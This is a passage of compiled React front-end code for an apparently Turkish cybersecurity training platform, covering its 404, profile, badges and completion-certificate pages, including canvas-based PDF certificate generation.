bg-[#28c840]" }), /* @__PURE__ */ React.createElement("span", { className: "ml-2 font-mono text-xs text-[#5c8a74]" }, "root@siberkampus: ~/lost")), /* @__PURE__ */ React.createElement("div", { className: "p-8 font-mono text-sm leading-relaxed" }, /* @__PURE__ */ React.createElement("p", { className: "text-[#00ff88]" }, "$ locate /your/page"), /* @__PURE__ */ React.createElement("p", { className: "text-[#ff2e88] mt-1" }, "[!] Error 404: hedef bulunamad\u0131."), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] mt-1" }, "// Arad\u0131\u011F\u0131n sayfa ta\u015F\u0131nm\u0131\u015F, silinmi\u015F ya da hi\xE7 var olmam\u0131\u015F olabilir."), /* @__PURE__ */ React.createElement("div", { className: "font-disp font-bold text-[clamp(64px,12vw,120px)] text-[#eafff5] leading-none my-6 text-center drop-shadow-[0_0_40px_rgba(0,255,136,.3)]" }, "4", /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88]" }, "0"), "4"), /* @__PURE__ */ React.createElement("p", { className: "text-[#00ff88]" }, "$ cd ~ ", /* @__PURE__ */ React.createElement("span", { className: "term-cursor" })))), /* @__PURE__ */ React.createElement("div", { className: "flex gap-3 justify-center mt-7 flex-wrap" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("home"), className: "font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-6 py-3.5 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all" }, "Anasayfaya D\xF6n \u2192"), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("rooms"), className: "font-mono text-sm text-[#cdeede] px-6 py-3.5 border border-[#103a26] hover:border-[#00ff88] hover:text-[#00ff88] transition-colors" }, "Laboratuvarlara Git")))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  var ProfilePage = ({ navigate, data }) => {
    const [user] = useUser();
    const own = !data || data.name === user.name;
    const u = own ? {
      name: user.name,
      pts: user.points,
      r: user.rank,
      lvl: user.level,
      solved: user.solved,
      badges: user.badges,
      streak: user.streak
    } : data;
    const initials = u.name.split(" ").map((s) => s[0]).join("").slice(0, 2).toUpperCase();
    const solvedList = own ? JSON.parse(localStorage.getItem("sk_solved_rooms") || "[]") : window.SK_ALL_ROOMS.slice(0, Math.min(window.SK_ALL_ROOMS.length, u.solved || 0)).map((r) => r.id);
    const solved = solvedList.map((id) => {
      const room = window.SK_ALL_ROOMS.find((r) => r.id === id);
      return room ? { n: room.name, cat: room.cat, pts: room.points, d: room.difficulty } : null;
    }).filter(Boolean);
    const badgeUser = own ? { points: user.points, level: user.level, rank: user.rank, streak: user.streak } : { points: u.pts || 0, level: u.lvl || 1, rank: u.r || 1e3, streak: u.streak || 0 };
    const dynamicBadges = window.getDynamicBadges ? window.getDynamicBadges(badgeUser, solvedList) : [];
    let badges = dynamicBadges.filter((b) => b.done).map((b) => b.icon);
    if (!own) {
      const targetCount = u.badges || 0;
      if (badges.length > targetCount) {
        badges = badges.slice(0, targetCount);
      } else if (badges.length < targetCount) {
        const remainingIcons = dynamicBadges.filter((b) => !badges.includes(b.icon)).map((b) => b.icon);
        const needed = targetCount - badges.length;
        badges = [...badges, ...remainingIcons.slice(0, needed)];
      }
    }
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(AppHeader, { navigate, active: "" }), /* @__PURE__ */ React.createElement("main", { className: "max-w-[1080px] mx-auto px-6 py-10" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("leaderboard"), className: "text-sm text-[#74998a] hover:text-[#00ff88] transition-colors mb-6" }, "\u2190 Leaderboard'a d\xF6n"), /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#103a26] p-8 mb-8 flex flex-col sm:flex-row items-center sm:items-start gap-6", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("div", { className: "w-24 h-24 flex-none rounded-2xl grid place-items-center text-[#5cffba] font-bold text-3xl border border-[#103a26]", style: { background: "linear-gradient(135deg,#0a3a24,#052b18)" } }, initials), /* @__PURE__ */ React.createElement("div", { className: "flex-1 text-center sm:text-left" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-center sm:justify-start gap-3 flex-wrap" }, /* @__PURE__ */ React.createElement("h1", { className: "text-3xl text-[#eafff5] whitespace-nowrap", style: { lineHeight: 1.2 } }, u.name), own && /* @__PURE__ */ React.createElement("span", { className: "font-mono text-[10px] text-[#00ff88] border border-[#103a26] px-2 py-1 rounded-full bg-[rgba(0,255,136,.04)]" }, "Bu sensin")), /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#74998a] mt-1.5 font-mono" }, "@", u.name.toLowerCase().replace(/\s+/g, ""), " \xB7 ", u.lvl ? "Level " + u.lvl : "G\xFCvenlik Uzman\u0131"), /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-center sm:justify-start gap-6 mt-5" }, [["S\u0131ra", "#" + u.r], ["Puan", (u.pts || 0).toLocaleString("tr-TR")], ["Rozet", badges.length], ["\xC7\xF6z\xFClen", solved.length]].map(([l, v], i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "text-center" }, /* @__PURE__ */ React.createElement("div", { className: "font-disp font-bold text-2xl text-[#00ff88]" }, v), /* @__PURE__ */ React.createElement("div", { className: "text-[11px] text-[#74998a] tracking-wide" }, l))))), own && /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("dashboard"), className: "font-mono text-sm text-[#cdeede] border border-[#103a26] px-5 py-2.5 rounded-lg hover:border-[#00ff88] hover:text-[#00ff88] transition-colors self-center" }, "Dashboard")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 lg:grid-cols-[1.4fr_1fr] gap-6" }, /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#0c2719] p-7", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("h2", { className: "text-lg text-[#eafff5] mb-5" }, "\xC7\xF6z\xFClen G\xF6revler"), /* @__PURE__ */ React.createElement("div", { className: "space-y-2.5" }, solved.map((s, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "flex items-center justify-between p-3.5 rounded-lg bg-[#04100a] border border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-3" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88]" }, "\u2713"), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "text-sm text-[#eafff5]" }, s.n), /* @__PURE__ */ React.createElement("div", { className: "text-xs text-[#74998a]" }, s.cat, " \xB7 ", s.d))), /* @__PURE__ */ React.createElement("span", { className: "font-mono text-sm text-[#00ff88]" }, "\u25C6 ", s.pts))))), /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#0c2719] p-7", style: { background: "linear-gradient(165deg,#07150e,#04100a)" } }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center justify-between mb-5" }, /* @__PURE__ */ React.createElement("h2", { className: "text-lg text-[#eafff5]" }, "Rozetler"), own && /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("badges"), className: "text-xs text-[#00ff88] hover:text-[#5cffba]" }, "T\xFCm\xFC \u2192")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-4 gap-3" }, badges.map((b, i) => /* @__PURE__ */ React.createElement("span", { key: i, className: "aspect-square rounded-lg grid place-items-center text-2xl border border-[#103a26] bg-[rgba(0,255,136,.03)]" }, b)), Array.from({ length: 3 }).map((_, i) => /* @__PURE__ */ React.createElement("span", { key: i, className: "aspect-square rounded-lg grid place-items-center text-2xl border border-[#0c2719] text-[#5c8a74]" }, "?")))))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  };
  var BadgesPage = ({ navigate }) => {
    const [user] = useUser();
    const solvedList = JSON.parse(localStorage.getItem("sk_solved_rooms") || "[]");
    const all = window.getDynamicBadges ? window.getDynamicBadges(user, solvedList) : [];
    const earned = all.filter((b) => b.done).length;
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(AppHeader, { navigate, active: "" }), /* @__PURE__ */ React.createElement("main", { className: "max-w-[1080px] mx-auto px-6 py-10" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("dashboard"), className: "text-sm text-[#74998a] hover:text-[#00ff88] transition-colors mb-6" }, "\u2190 Dashboard'a d\xF6n"), /* @__PURE__ */ React.createElement("div", { className: "flex items-end justify-between flex-wrap gap-4 mb-8" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement(SectionLabel, null, "Ba\u015Far\u0131mlar"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(28px,4vw,42px)] text-[#eafff5]" }, "Rozetlerim")), /* @__PURE__ */ React.createElement("div", { className: "text-right" }, /* @__PURE__ */ React.createElement("div", { className: "font-disp font-bold text-3xl text-[#00ff88]" }, earned, /* @__PURE__ */ React.createElement("span", { className: "text-[#5c8a74] text-2xl" }, "/", all.length)), /* @__PURE__ */ React.createElement("div", { className: "text-xs text-[#74998a]" }, "rozet kazan\u0131ld\u0131"))), /* @__PURE__ */ React.createElement("div", { className: "h-2 rounded-full bg-[#0c2719] overflow-hidden mb-10" }, /* @__PURE__ */ React.createElement("div", { className: "h-full rounded-full bg-gradient-to-r from-[#00d978] to-[#00ff88] shadow-[0_0_12px_var(--glow)]", style: { width: earned / all.length * 100 + "%" } })), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4" }, all.map((b, i) => /* @__PURE__ */ React.createElement("div", { key: i, className: "rounded-2xl border p-6 text-center transition-all " + (b.done ? "border-[#103a26] hover:border-[#00ff88] hover:-translate-y-1" : "border-[#0c2719] opacity-70"), style: { background: b.done ? "linear-gradient(165deg,#07150e,#04100a)" : "#050f0a" } }, /* @__PURE__ */ React.createElement("div", { className: "text-4xl mb-3", style: { filter: b.done ? "none" : "grayscale(1)" } }, b.icon), /* @__PURE__ */ React.createElement("h3", { className: "text-sm mb-1.5 " + (b.done ? "text-[#eafff5]" : "text-[#74998a]") }, b.name), /* @__PURE__ */ React.createElement("p", { className: "text-xs text-[#74998a] leading-relaxed mb-3" }, b.desc), b.done ? /* @__PURE__ */ React.createElement("span", { className: "font-mono text-xs text-[#00ff88]" }, "\u2713 Kazan\u0131ld\u0131") : /* @__PURE__ */ React.createElement("span", { className: "font-mono text-xs text-[#ffd166]" }, "\u23F3 ", b.prog))))), /* @__PURE__ */ React.createElement(Footer, { navigate }));
  };
  var wrapText = (text, maxChars) => {
    if (!text) return [];
    const words = text.split(" ");
    const lines = [];
    let currentLine = "";
    words.forEach((word) => {
      if ((currentLine + " " + word).trim().length <= maxChars) {
        currentLine = (currentLine + " " + word).trim();
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    });
    if (currentLine) lines.push(currentLine);
    return lines;
  };
  var CertificatesPage = ({ navigate }) => {
    const [user, updateUser] = useUser();
    const [preview, setPreview] = useState(null);
    const [newName, setNewName] = useState(user.name);
    const [nameSuccess, setNameSuccess] = useState("");
    const saveName = () => {
      if (!newName.trim()) return;
      updateUser({ name: newName.trim(), nameChanged: true });
      setNameSuccess("\u0130sminiz sertifikalar i\xE7in ba\u015Far\u0131yla kilitlendi!");
      setTimeout(() => setNameSuccess(""), 3e3);
    };
    const solvedList = JSON.parse(localStorage.getItem("sk_solved_rooms") || "[]");
    const webSolvedCount = solvedList.filter((id) => id.startsWith("web-")).length;
    const sysSolvedCount = solvedList.filter((id) => id.startsWith("sys-")).length;
    const netSolvedCount = solvedList.filter((id) => id.startsWith("net-")).length;
    const totalSolved = solvedList.length;
    const certs = [
      {
        title: "Web Exploitation Temelleri",
        code: webSolvedCount >= 10 ? `SK-WEB-2026-${(user.name || "").slice(0, 3).toUpperCase()}-${1e3 + (user.points || 0)}` : null,
        date: webSolvedCount >= 10 ? "05 Haz 2026" : null,
        done: webSolvedCount >= 10,
        tasksDone: webSolvedCount,
        tasksRequired: 10,
        prog: Math.min(99, Math.round(webSolvedCount / 10 * 100)),
        desc: "Bu sertifika sahibi, Siber Kamp\xFCs Akademi b\xFCnyesindeki uygulamal\u0131 Web G\xFCvenli\u011Fi e\u011Fitimini ba\u015Far\u0131yla tamamlam\u0131\u015Ft\u0131r. E\u011Fitim s\xFCrecinde SQL Injection, Cross-Site Scripting (XSS), CSRF ve Dosya Y\xFCkleme A\xE7\u0131kl\u0131klar\u0131 (File Upload Bypass) gibi kritik zafiyetlerin tespiti, s\xF6m\xFCr\xFClmesi ve kapat\u0131lmas\u0131 konular\u0131nda pratik yetkinlik kazanarak, ilgili t\xFCm hacking laboratuvarlar\u0131n\u0131 ve CTF g\xF6revlerini \xE7\xF6zm\xFC\u015Ft\xFCr."
      },
      {
        title: "Linux Sistem G\xFCvenli\u011Fi",
        code: sysSolvedCount >= 10 ? `SK-LIN-2026-${(user.name || "").slice(0, 3).toUpperCase()}-${1e3 + (user.points || 0)}` : null,
        date: sysSolvedCount >= 10 ? "05 Haz 2026" : null,
        done: sysSolvedCount >= 10,
        tasksDone: sysSolvedCount,
        tasksRequired: 10,
        prog: Math.min(99, Math.round(sysSolvedCount / 10 * 100)),
        desc: "Bu sertifika sahibi, Siber Kamp\xFCs Akademi b\xFCnyesindeki Linux Sistem G\xFCvenli\u011Fi ve Ayr\u0131cal\u0131k Y\xFCkseltme e\u011Fitimini ba\u015Far\u0131yla tamamlam\u0131\u015Ft\u0131r. E\u011Fitim s\xFCrecinde SUID/SGID haklar\u0131n\u0131n k\xF6t\xFCye kullan\u0131m\u0131, Cron Job zafiyetleri, PATH suistimalleri, Linux Kernel Exploitleri ve sistem s\u0131k\u0131la\u015Ft\u0131rma (Hardening) konular\u0131nda pratik yetkinlik kazanarak, ilgili t\xFCm hacking laboratuvarlar\u0131n\u0131 ve CTF g\xF6revlerini \xE7\xF6zm\xFC\u015Ft\xFCr."
      },
      {
        title: "A\u011F S\u0131zma Testi",
        code: netSolvedCount >= 10 ? `SK-NET-2026-${(user.name || "").slice(0, 3).toUpperCase()}-${1e3 + (user.points || 0)}` : null,
        date: netSolvedCount >= 10 ? "05 Haz 2026" : null,
        done: netSolvedCount >= 10,
        tasksDone: netSolvedCount,
        tasksRequired: 10,
        prog: Math.min(99, Math.round(netSolvedCount / 10 * 100)),
        desc: "Bu sertifika sahibi, Siber Kamp\xFCs Akademi b\xFCnyesindeki kurumsal A\u011F S\u0131zma Testleri e\u011Fitimini ba\u015Far\u0131yla tamamlam\u0131\u015Ft\u0131r. E\u011Fitim s\xFCrecinde Nmap ile geli\u015Fmi\u015F ke\u015Fif, ARP Zehirlemesi, SMB zafiyetleri ve Active Directory ortamlar\u0131nda bilgi toplama ve s\xF6m\xFCr\xFC faaliyetleri y\xFCr\xFCterek pratik yetkinlik kazanm\u0131\u015F, ilgili t\xFCm hacking laboratuvarlar\u0131n\u0131 ve CTF g\xF6revlerini \xE7\xF6zm\xFC\u015Ft\xFCr."
      },
      {
        title: "\u0130leri CTF & Red Team",
        code: totalSolved >= 20 ? `SK-RED-2026-${(user.name || "").slice(0, 3).toUpperCase()}-${1e3 + (user.points || 0)}` : null,
        date: totalSolved >= 20 ? "05 Haz 2026" : null,
        done: totalSolved >= 20,
        tasksDone: totalSolved,
        tasksRequired: 20,
        prog: Math.min(99, Math.round(totalSolved / 20 * 100)),
        desc: "Bu sertifika sahibi, Siber Kamp\xFCs Akademi b\xFCnyesindeki \u0130leri CTF ve Red Team Metodolojileri e\u011Fitimini ba\u015Far\u0131yla tamamlam\u0131\u015Ft\u0131r. E\u011Fitim s\xFCrecinde \xE7ok ad\u0131ml\u0131 s\u0131zma senaryolar\u0131, a\u011Flar aras\u0131 pivotlama ve t\xFCnelleme, custom backdoor yaz\u0131m\u0131 ve anti-debug korumalar\u0131n\u0131 atlatma konular\u0131nda pratik yetkinlik kazanarak, ilgili t\xFCm hacking laboratuvarlar\u0131n\u0131 ve CTF g\xF6revlerini \xE7\xF6zm\xFC\u015Ft\xFCr."
      }
    ];
    const CertVisual = ({ cert, forDownload }) => {
      const w = forDownload ? 1200 : 600;
      const h = forDownload ? 850 : 425;
      const s = forDownload ? 2 : 1;
      return /* @__PURE__ */ React.createElement("svg", { xmlns: "http://www.w3.org/2000/svg", viewBox: `0 0 ${w} ${h}`, width: w, height: h, style: { maxWidth: "100%", height: "auto" } }, /* @__PURE__ */ React.createElement("defs", null, /* @__PURE__ */ React.createElement("linearGradient", { id: "certBg", x1: "0", y1: "0", x2: "1", y2: "1" }, /* @__PURE__ */ React.createElement("stop", { offset: "0%", stopColor: "#08120d" }), /* @__PURE__ */ React.createElement("stop", { offset: "100%", stopColor: "#04100a" })), /* @__PURE__ */ React.createElement("linearGradient", { id: "certGlow", x1: "0", y1: "0", x2: "0", y2: "1" }, /* @__PURE__ */ React.createElement("stop", { offset: "0%", stopColor: "#00ff88", stopOpacity: "0.15" }), /* @__PURE__ */ React.createElement("stop", { offset: "100%", stopColor: "#00ff88", stopOpacity: "0" })), /* @__PURE__ */ React.createElement("linearGradient", { id: "certLine", x1: "0", y1: "0", x2: "1", y2: "0" }, /* @__PURE__ */ React.createElement("stop", { offset: "0%", stopColor: "transparent" }), /* @__PURE__ */ React.createElement("stop", { offset: "50%", stopColor: "#00ff88" }), /* @__PURE__ */ React.createElement("stop", { offset: "100%", stopColor: "transparent" }))), /* @__PURE__ */ React.createElement("rect", { width: w, height: h, rx: 16 * s, fill: "url(#certBg)" }), /* @__PURE__ */ React.createElement("rect", { x: 2 * s, y: 2 * s, width: w - 4 * s, height: h - 4 * s, rx: 14 * s, fill: "none", stroke: "#103a26", strokeWidth: 1.5 * s }), Array.from({ length: Math.floor(w / 40) }).map((_, i) => /* @__PURE__ */ React.createElement("line", { key: "v" + i, x1: i * 40 * s, y1: 0, x2: i * 40 * s, y2: h, stroke: "rgba(0,255,136,0.04)", strokeWidth: s })), Array.from({ length: Math.floor(h / 40) }).map((_, i) => /* @__PURE__ */ React.createElement("line", { key: "h" + i, x1: 0, y1: i * 40 * s, x2: w, y2: i * 40 * s, stroke: "rgba(0,255,136,0.04)", strokeWidth: s })), /* @__PURE__ */ React.createElement("rect", { x: 0, y: 0, width: w, height: h * 0.35, rx: 16 * s, fill: "url(#certGlow)" }), /* @__PURE__ */ React.createElement("path", { d: `M${24 * s},${8 * s} L${8 * s},${8 * s} L${8 * s},${24 * s}`, fill: "none", stroke: "#00ff88", strokeWidth: 2 * s, strokeLinecap: "round" }), /* @__PURE__ */ React.createElement("path", { d: `M${w - 24 * s},${8 * s} L${w - 8 * s},${8 * s} L${w - 8 * s},${24 * s}`, fill: "none", stroke: "#00ff88", strokeWidth: 2 * s, strokeLinecap: "round" }), /* @__PURE__ */ React.createElement("path", { d: `M${24 * s},${h - 8 * s} L${8 * s},${h - 8 * s} L${8 * s},${h - 24 * s}`, fill: "none", stroke: "#00ff88", strokeWidth: 2 * s, strokeLinecap: "round" }), /* @__PURE__ */ React.createElement("path", { d: `M${w - 24 * s},${h - 8 * s} L${w - 8 * s},${h - 8 * s} L${w - 8 * s},${h - 24 * s}`, fill: "none", stroke: "#00ff88", strokeWidth: 2 * s, strokeLinecap: "round" }), /* @__PURE__ */ React.createElement("rect", { x: w / 2 - 17 * s, y: 25 * s, width: 34 * s, height: 34 * s, rx: 8 * s, fill: "none", stroke: "#00ff88", strokeWidth: 1.5 * s }), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 23 * s, textAnchor: "middle", fill: "#00ff88", fontFamily: "JetBrains Mono, monospace", fontSize: 14 * s, fontWeight: "bold" }, ">_"), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 50 * s, textAnchor: "middle", fill: "#eafff5", fontFamily: "Chakra Petch, sans-serif", fontSize: 14 * s, fontWeight: "bold" }, "siber", /* @__PURE__ */ React.createElement("tspan", { fill: "#00ff88" }, "kampus")), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 72 * s, textAnchor: "middle", fill: "#74998a", fontFamily: "JetBrains Mono, monospace", fontSize: 9 * s, letterSpacing: 4 * s }, "TAMAMLAMA SERT\u0130F\u0130KASI"), /* @__PURE__ */ React.createElement("rect", { x: w * 0.15, y: 25 * s + 84 * s, width: w * 0.7, height: 1.5 * s, fill: "url(#certLine)" }), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 110 * s, textAnchor: "middle", fill: "#00ff88", fontFamily: "Chakra Petch, sans-serif", fontSize: 22 * s, fontWeight: "bold", style: { filter: "drop-shadow(0 0 12px rgba(0,255,136,0.4))" } }, cert.title), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 138 * s, textAnchor: "middle", fill: "#74998a", fontFamily: "JetBrains Mono, monospace", fontSize: 9 * s }, "ba\u015Far\u0131yla tamamlayan"), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 172 * s, textAnchor: "middle", fill: "#eafff5", fontFamily: "Chakra Petch, sans-serif", fontSize: 28 * s, fontWeight: "bold" }, user.name), /* @__PURE__ */ React.createElement("rect", { x: w * 0.25, y: 25 * s + 188 * s, width: w * 0.5, height: 1 * s, fill: "url(#certLine)" }), cert.desc && /* @__PURE__ */ React.createElement("g", null, wrapText(cert.desc, 76).map((line, idx) => /* @__PURE__ */ React.createElement("text", { key: idx, x: w / 2, y: 25 * s + 210 * s + idx * 12 * s, textAnchor: "middle", fill: "#74998a", fontFamily: "JetBrains Mono, monospace", fontSize: 7.5 * s }, line))), /* @__PURE__ */ React.createElement("rect", { x: w * 0.25, y: 25 * s + 280 * s, width: w * 0.5, height: 1 * s, fill: "url(#certLine)" }), /* @__PURE__ */ React.createElement("text", { x: w * 0.25, y: 25 * s + 308 * s, fill: "#74998a", fontFamily: "JetBrains Mono, monospace", fontSize: 9 * s }, "Tarih: ", /* @__PURE__ */ React.createElement("tspan", { fill: "#5cffba" }, cert.date)), /* @__PURE__ */ React.createElement("text", { x: w * 0.75, y: 25 * s + 308 * s, textAnchor: "end", fill: "#74998a", fontFamily: "JetBrains Mono, monospace", fontSize: 9 * s }, "G\xF6revler: ", /* @__PURE__ */ React.createElement("tspan", { fill: "#5cffba" }, cert.tasksDone, "/", cert.tasksRequired)), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: 25 * s + 328 * s, textAnchor: "middle", fill: "#74998a", fontFamily: "JetBrains Mono, monospace", fontSize: 9 * s }, "Do\u011Frulama Kodu: ", /* @__PURE__ */ React.createElement("tspan", { fill: "#00ff88" }, cert.code)), /* @__PURE__ */ React.createElement("text", { x: w / 2, y: h - 28 * s, textAnchor: "middle", fill: "#00ff88", fontFamily: "sans-serif", fontSize: 20 * s }, "\u{1F396}\uFE0F"));
    };
    const downloadCert = (cert) => {
      document.fonts.ready.then(() => {
        const scale = 4;
        const svgW = 1200 * scale, svgH = 850 * scale;
        const canvas = document.createElement("canvas");
        canvas.width = svgW;
        canvas.height = svgH;
        const ctx = canvas.getContext("2d");
        const bgGrad = ctx.createLinearGradient(0, 0, svgW, svgH);
        bgGrad.addColorStop(0, "#08120d");
        bgGrad.addColorStop(1, "#04100a");
        ctx.fillStyle = bgGrad;
        ctx.beginPath();
        ctx.roundRect(0, 0, svgW, svgH, 32 * scale);
        ctx.fill();
        ctx.strokeStyle = "#103a26";
        ctx.lineWidth = 3 * scale;
        ctx.beginPath();
        ctx.roundRect(4 * scale, 4 * scale, svgW - 8 * scale, svgH - 8 * scale, 28 * scale);
        ctx.stroke();
        ctx.strokeStyle = "rgba(0,255,136,0.04)";
        ctx.lineWidth = 2 * scale;
        for (let i = 0; i < svgW; i += 40 * scale) {
          ctx.beginPath();
          ctx.moveTo(i, 0);
          ctx.lineTo(i, svgH);
          ctx.stroke();
        }
        for (let i = 0; i < svgH; i += 40 * scale) {
          ctx.beginPath();
          ctx.moveTo(0, i);
          ctx.lineTo(svgW, i);
          ctx.stroke();
        }
        ctx.strokeStyle = "#00ff88";
        ctx.lineWidth = 4 * scale;
        ctx.lineCap = "round";
        [
          [48 * scale, 16 * scale, 16 * scale, 16 * scale, 16 * scale, 48 * scale],
          [svgW - 48 * scale, 16 * scale, svgW - 16 * scale, 16 * scale, svgW - 16 * scale, 48 * scale],
          [48 * scale, svgH - 16 * scale, 16 * scale, svgH - 16 * scale, 16 * scale, svgH - 48 * scale],
          [svgW - 48 * scale, svgH - 16 * scale, svgW - 16 * scale, svgH - 16 * scale, svgW - 16 * scale, svgH - 48 * scale]
        ].forEach(([x1, y1, x2, y2, x3, y3]) => {
          ctx.beginPath();
          ctx.moveTo(x1, y1);
          ctx.lineTo(x2, y2);
          ctx.lineTo(x3, y3);
          ctx.stroke();
        });
        ctx.strokeStyle = "#00ff88";
        ctx.lineWidth = 3 * scale;
        ctx.beginPath();
        ctx.roundRect(svgW / 2 - 34 * scale, 50 * scale, 68 * scale, 68 * scale, 16 * scale);
        ctx.stroke();
        ctx.fillStyle = "#00ff88";
        ctx.font = `bold ${28 * scale}px "JetBrains Mono", monospace`;
        ctx.textAlign = "center";
        ctx.fillText(">_", svgW / 2, 96 * scale);
        ctx.font = `bold ${28 * scale}px "Chakra Petch", sans-serif`;
        ctx.fillStyle = "#eafff5";
        ctx.textAlign = "right";
        ctx.fillText("siber", svgW / 2 - 2 * scale, 150 * scale);
        ctx.fillStyle = "#00ff88";
        ctx.textAlign = "left";
        ctx.fillText("kampus", svgW / 2 + 2 * scale, 150 * scale);
        ctx.font = `${18 * scale}px "JetBrains Mono", monospace`;
        ctx.fillStyle = "#74998a";
        ctx.textAlign = "center";
        ctx.fillText("TAMAMLAMA SERT\u0130F\u0130KASI", svgW / 2, 186 * scale);
        const lineGrad = ctx.createLinearGradient(svgW * 0.2, 0, svgW * 0.8, 0);
        lineGrad.addColorStop(0, "transparent");
        lineGrad.addColorStop(0.5, "#00ff88");
        lineGrad.addColorStop(1, "transparent");
        ctx.fillStyle = lineGrad;
        ctx.fillRect(svgW * 0.2, 202 * scale, svgW * 0.6, 2 * scale);
        ctx.font = `bold ${44 * scale}px "Chakra Petch", sans-serif`;
        ctx.fillStyle = "#00ff88";
        ctx.shadowColor = "rgba(0,255,136,0.4)";
        ctx.shadowBlur = 24 * scale;
        ctx.fillText(cert.title, svgW / 2, 256 * scale);
        ctx.shadowBlur = 0;
        ctx.font = `${20 * scale}px "JetBrains Mono", monospace`;
        ctx.fillStyle = "#74998a";
        ctx.fillText("ba\u015Far\u0131yla tamamlayan", svgW / 2, 310 * scale);
        ctx.font = `bold ${56 * scale}px "Chakra Petch", sans-serif`;
        ctx.fillStyle = "#eafff5";
        ctx.fillText(user.name, svgW / 2, 376 * scale);
        ctx.fillStyle = lineGrad;
        ctx.fillRect(svgW * 0.25, 410 * scale, svgW * 0.5, 1 * scale);
        ctx.font = `${15 * scale}px "JetBrains Mono", monospace`;
        ctx.fillStyle = "#74998a";
        const descLines = wrapText(cert.desc, 80);
        descLines.forEach((line, idx) => {
          ctx.fillText(line, svgW / 2, (450 + idx * 24) * scale);
        });
        ctx.fillStyle = lineGrad;
        ctx.fillRect(svgW * 0.25, 590 * scale, svgW * 0.5, 1 * scale);
        ctx.font = `${18 * scale}px "JetBrains Mono", monospace`;
        ctx.textAlign = "left";
        ctx.fillStyle = "#74998a";
        ctx.fillText("Tarih: ", svgW * 0.2, 640 * scale);
        const dateLabelWidth = ctx.measureText("Tarih: ").width;
        ctx.fillStyle = "#5cffba";
        ctx.fillText(cert.date, svgW * 0.2 + dateLabelWidth, 640 * scale);
        ctx.textAlign = "right";
        ctx.fillStyle = "#5cffba";
        ctx.fillText(cert.tasksDone + "/" + cert.tasksRequired, svgW * 0.8, 640 * scale);
        const tasksValWidth = ctx.measureText(cert.tasksDone + "/" + cert.tasksRequired).width;
        ctx.fillStyle = "#74998a";
        ctx.fillText("G\xF6revler: ", svgW * 0.8 - tasksValWidth - 5 * scale, 640 * scale);
        ctx.textAlign = "right";
        ctx.fillStyle = "#74998a";
        ctx.fillText("Do\u011Frulama Kodu: ", svgW / 2, 680 * scale);
        ctx.textAlign = "left";
        ctx.fillStyle = "#00ff88";
        ctx.fillText(cert.code, svgW / 2 + 5 * scale, 680 * scale);
        ctx.textAlign = "center";
        ctx.font = `${40 * scale}px sans-serif`;
        ctx.fillText("\u{1F396}\uFE0F", svgW / 2, svgH - 56 * scale);
        const imgData = canvas.toDataURL("image/png", 1);
        const savePDF = () => {
          const { jsPDF } = window.jspdf;
          const pdf = new jsPDF({ orientation: "landscape", unit: "px", format: [1200, 850] });
          pdf.addImage(imgData, "PNG", 0, 0, 1200, 850);
          pdf.save("siberkampus-sertifika-" + cert.code + ".pdf");
        };
        if (window.jspdf) {
          savePDF();
        } else {
          const script = document.createElement("script");
          script.src = "https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js";
          script.onload = () => savePDF();
          document.head.appendChild(script);
        }
      });
    };
